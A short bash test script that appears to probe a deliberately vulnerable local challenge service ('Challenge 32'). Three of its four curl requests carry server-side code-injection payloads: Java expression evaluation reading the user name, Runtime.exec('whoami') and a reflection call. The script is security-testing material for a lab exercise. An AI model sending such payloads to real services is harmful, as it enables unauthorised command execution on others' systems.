#!/bin/bash

echo "Testing Challenge 32 - Multi-Vector Code Execution"
echo "=================================================="

# Test 1: Basic functionality
echo "Test 1: Basic format operation"
curl -s -X POST http://localhost:8081/api/process \
  -H "Content-Type: application/json" \
  -d '{"operation": "format", "data": "hello world"}' \
  --connect-timeout 5 --max-time 10 | jq . 2>/dev/null || echo "Request failed or timed out"

echo ""

# Test 2: Transform operation (vulnerable)
echo "Test 2: Transform operation with JavaScript execution"
curl -s -X POST http://localhost:8081/api/process \
  -H "Content-Type: application/json" \
  -d '{"operation": "transform", "data": {"expression": "java.lang.System.getProperty(\"user.name\")", "target": "test"}}' \
  --connect-timeout 5 --max-time 10 | jq . 2>/dev/null || echo "Request failed or timed out"

echo ""

# Test 3: Calculate operation (vulnerable)
echo "Test 3: Calculate operation with JavaScript execution"
curl -s -X POST http://localhost:8081/api/process \
  -H "Content-Type: application/json" \
  -d '{"operation": "calculate", "data": {"formula": "java.lang.Runtime.getRuntime().exec(\"whoami\")"}}' \
  --connect-timeout 5 --max-time 10 | jq . 2>/dev/null || echo "Request failed or timed out"

echo ""

# Test 4: Reflection operation (vulnerable)
echo "Test 4: Reflection operation"
curl -s -X POST http://localhost:8081/api/process \
  -H "Content-Type: application/json" \
  -d '{"operation": "customOp", "data": {"className": "java.lang.System", "methodName": "getProperty"}}' \
  --connect-timeout 5 --max-time 10 | jq . 2>/dev/null || echo "Request failed or timed out"

echo ""
echo "Testing complete!"
